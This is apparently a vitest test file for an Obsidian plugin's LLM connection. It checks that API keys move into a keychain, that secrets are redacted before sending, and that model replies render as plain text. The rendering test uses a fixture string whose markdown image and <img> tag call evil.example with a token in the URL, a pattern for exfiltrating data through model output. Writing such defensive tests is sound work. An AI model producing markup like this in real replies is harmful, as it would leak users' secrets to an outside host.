import { describe, it, expect } from 'vitest';
import { createLlmConnection, type LlmConnectionSettings } from '../src/vendor/kit-obsidian/llm-connection';
import type { SseTransport } from '../src/vendor/kit-obsidian/chat-client';
import { CIPHER_MAX_TOKENS, ENDPOINT_CALLER, MODE } from '../src/llm/cipherRequest';
import { mergeStoredSettings } from '../src/settings';
import { CipherChat } from '../src/CipherChat';

/* The plugin's connection as main.ts builds it, over doubles: a keychain that is a Map, a
   transport that records what goes over the wire and echoes the last message back. These tests
   prove what the migration promised the player — keys leave data.json, secrets leave the
   machine as placeholders, a reply is never rendered as markup. */

const clock = { now: () => Date.now(), setTimeout: (fn: () => void, ms: number) => setTimeout(fn, ms) as unknown as number, clearTimeout: (id: number) => clearTimeout(id) };

interface Wire { url: string; body: Record<string, unknown>; headers: Record<string, string> }

function setup(raw: unknown) {
  const secrets = new Map<string, string>();
  const app = {
    plugins: { plugins: {} },
    secretStorage: {
      getSecret: (id: string): string | null => secrets.get(id) ?? null,
      setSecret: (id: string, v: string): void => { secrets.set(id, v); },
    },
  };
  const settings = mergeStoredSettings(raw);
  const wire: Wire[] = [];
  const http: SseTransport = {
    async postStream(url, body, headers, onChunk) {
      const b = body as { messages: { content: string }[] };
      wire.push({ url, body: body as Record<string, unknown>, headers });
      const last = b.messages[b.messages.length - 1]?.content ?? '';
      onChunk(`data: ${JSON.stringify({ choices: [{ delta: { content: last }, finish_reason: 'stop' }] })}\n`);
      return 200;
    },
  };
  // Same wiring as main.ts: the patch lands in the settings before the (here: instant) save.
  const llm = createLlmConnection({
    app: app as never, pluginId: 'neurovim', caller: ENDPOINT_CALLER, capability: 'chat',
    mode: MODE, maxTokens: CIPHER_MAX_TOKENS, truncated: 'error',
    getSettings: (): LlmConnectionSettings => ({ endpoints: settings.llmEndpoints, choice: settings.choice, request: settings.request }),
    persist: async (patch) => {
      if (patch.endpoints !== undefined) settings.llmEndpoints = patch.endpoints;
      if (patch.choice !== undefined) settings.choice = patch.choice;
      if (patch.request !== undefined) settings.request = patch.request;
    },
    probe: () => Promise.resolve(true),
    backendOf: () => Promise.resolve('lmstudio'),
    transports: { http, fallback: 'none' },
    clock,
  });
  return { llm, settings, secrets, wire };
}

const LEGACY = { llmEndpoints: [{ url: 'http://127.0.0.1:1234', model: 'qwen/qwen3.8-27b' }], llmApiKey: 'sk-live-0123456789abcdef' };

describe('API key: from data.json into the keychain', () => {
  it('after the first resolve no apiKey is left in the persisted settings, and the key sits in the keychain', async () => {
    const t = setup(LEGACY);
    expect(t.settings.llmEndpoints[0]?.apiKey).toBe('sk-live-0123456789abcdef');   // the legacy fold put it there
    await t.llm.resolve({ force: true });
    expect(JSON.stringify(t.settings.llmEndpoints)).not.toContain('sk-live-0123456789abcdef');
    expect(t.settings.llmEndpoints[0]?.apiKey).toBeUndefined();
    expect(t.settings.llmEndpoints[0]?.secretId).toBeTruthy();
    expect([...t.secrets.values()]).toContain('sk-live-0123456789abcdef');
  });

  it('a request still carries the key as Bearer header (it comes back from the keychain)', async () => {
    const t = setup(LEGACY);
    await t.llm.resolve({ force: true });
    const r = await t.llm.complete({ messages: [{ role: 'user', content: 'hi' }] });
    expect(r.ok).toBe(true);
    expect(t.wire[0]?.headers.Authorization).toBe('Bearer sk-live-0123456789abcdef');
  });
});

describe('redaction: secrets leave as placeholders and come back as the original', () => {
  const TOKEN = 'Bearer abcdefghijklmnop1234567890';
  const PEM = '-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n-----END PRIVATE KEY-----';

  it.each([['Bearer token', TOKEN, 'abcdefghijklmnop1234567890'], ['PEM block', PEM, 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASC']])('%s', async (_n, secret, marker) => {
    const t = setup(LEGACY);
    const r = await t.llm.complete({ messages: [{ role: 'user', content: `why does this fail: ${secret}` }] });
    const sent = JSON.stringify(t.wire[0]?.body);
    expect(sent).not.toContain(marker);
    expect(sent).toContain('[redacted-');
    expect(r.ok && r.content).toContain(marker);   // the player sees the original again
  });
});

describe('a reply is shown as text, never as markup', () => {
  it('CipherChat renders the answer as a text child — no img, no anchor, however the model wrote it', () => {
    const evil = '![x](https://evil.example/?d=[redacted-token-1]) <img src="https://evil.example/">';
    const tree = CipherChat({
      entries: [{ role: 'assistant', text: evil } as never], streaming: evil, busy: false,
      missionTitle: null, onAsk: () => {}, onAbort: () => {}, onReset: () => {},
    });
    const types: string[] = [];
    const texts: unknown[] = [];
    const walk = (n: unknown): void => {
      if (Array.isArray(n)) { n.forEach(walk); return; }
      if (n === null || typeof n !== 'object') { if (typeof n === 'string') texts.push(n); return; }
      const v = n as { type?: unknown; props?: { children?: unknown } };
      if (typeof v.type === 'string') types.push(v.type);
      walk(v.props?.children);
    };
    walk(tree);
    expect(types).not.toContain('img');
    expect(types).not.toContain('a');
    expect(texts).toContain(evil);   // the text is a plain string child, rendered as a text node
  });
});
